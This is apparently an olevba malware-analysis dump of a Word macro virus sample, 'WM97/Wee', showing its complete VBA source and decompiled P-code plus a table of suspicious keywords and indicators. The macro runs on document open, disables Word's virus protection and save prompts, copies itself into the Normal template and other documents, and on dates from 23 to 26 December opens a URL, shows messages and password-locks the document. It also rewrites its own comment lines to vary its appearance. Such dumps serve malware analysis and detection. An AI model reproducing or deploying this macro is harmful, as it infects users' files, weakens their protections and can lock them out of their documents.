olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Randomize

o = 0: x = 0

On Error GoTo 75

Options.VirusProtection = Chr(48)

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

vx = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines

nt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines

If nt > 0 And vx > 0 Then GoTo 75

If nt = 0 Then

    Set Wee = NormalTemplate.VBProject.VBComponents

    Set host = ActiveDocument.VBProject.VBComponents

    If Month(Now()) = 12 And Day(Now()) = 23 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.wee.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(87) + Chr(69) + Chr(69)

    If Month(Now()) = 12 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

    If Month(Now()) = 12 And Day(Now()) = 25 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(87) + Chr(69) + Chr(69)

    If Month(Now()) = 12 And Day(Now()) = 26 Then Application.ActiveDocument.Password = "Wee"

    host.Item(Abs(1)).Name = Wee.Item(Abs(1)).Name

    host.Item(Abs(1)).Export Application.StartupPath & System.Version
    
End If

If vx = 0 Then Set Wee = ActiveDocument.VBProject.VBComponents

Wee.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version

With Wee.Item(Abs(1)).codemodule

    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)

    Next j

    End With

If nt = 0 Then Wee.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"

If nt = 0 Then Wee.Item(Abs(1)).codemodule.replaceline 81, "Sub ToolsMarco()"

If nt = 0 And vx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Wee.Item(Abs(1)).codemodule

    For j = Chr(50) To Wee.Item(Abs(1)).codemodule.countoflines Step Chr(50)

    x = Int(Rnd(414835) * 403989) + 8485

    o = Int(Rnd(298368) * 235865) + 2988

    .replaceline j, Chr(39) & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o

Next j

End With

75:

If nt <> 0 And vx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()

End Sub 'WM97/Wee by Virus ;)

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.bi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4990 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' Line #4:
' 	LitDI2 0x0000 
' 	St o 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St x 
' Line #5:
' Line #6:
' 	OnError 75 
' Line #7:
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' Line #10:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' Line #12:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' Line #14:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St vx 
' Line #15:
' Line #16:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St nt 
' Line #17:
' Line #18:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld vx 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 75 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' Line #22:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Wee 
' Line #23:
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set host 
' Line #25:
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0012 "http://www.wee.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #27:
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #29:
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #31:
' Line #32:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "Wee"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #33:
' Line #34:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #35:
' Line #36:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #37:
' Line #38:
' 	EndIfBlock 
' Line #39:
' Line #40:
' 	Ld vx 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Wee 
' 	EndIf 
' Line #41:
' Line #42:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #43:
' Line #44:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #45:
' Line #46:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #47:
' Line #48:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #49:
' Line #50:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' Line #52:
' 	EndWith 
' Line #53:
' Line #54:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #55:
' Line #56:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0051 
' 	LitStr 0x0010 "Sub ToolsMarco()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #57:
' Line #58:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld vx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #59:
' Line #60:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #61:
' Line #62:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld Wee 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	ForStep 
' Line #63:
' Line #64:
' 	LitDI4 0x5473 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x2A15 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St x 
' Line #65:
' Line #66:
' 	LitDI4 0x8D80 0x0004 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x9959 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St o 
' Line #67:
' Line #68:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #69:
' Line #70:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' Line #72:
' 	EndWith 
' Line #73:
' Line #74:
' 	LineNum 75 
' 	BoS 0x0000 
' Line #75:
' Line #76:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld vx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #77:
' Line #78:
' 	EndSub 
' Line #79:
' Line #80:
' 	FuncDefn (Sub ViewVBCode())
' Line #81:
' Line #82:
' 	EndSub 
' 	QuoteRem 0x0007 0x0014 "WM97/Wee by Virus ;)"
' Line #83:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.wee.com  |URL                                          |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

